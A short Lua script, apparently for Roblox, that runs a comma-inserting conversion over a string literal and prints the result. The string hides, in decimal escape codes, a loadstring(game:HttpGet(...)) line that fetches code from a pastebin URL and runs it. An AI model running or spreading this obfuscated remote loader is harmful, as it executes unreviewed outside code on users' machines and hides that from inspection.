local function Convert(str)
    local filter = string.gsub(str, "(%d)", "%1,")
    filter = string.gsub(filter, ",$", "")
    return filter
end

local needconvert = 'loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\98\82\85\120\76\84\118\50\34\41\41\40\41")()'
local needtransorm = Convert(needconvert)
print(needtransorm)
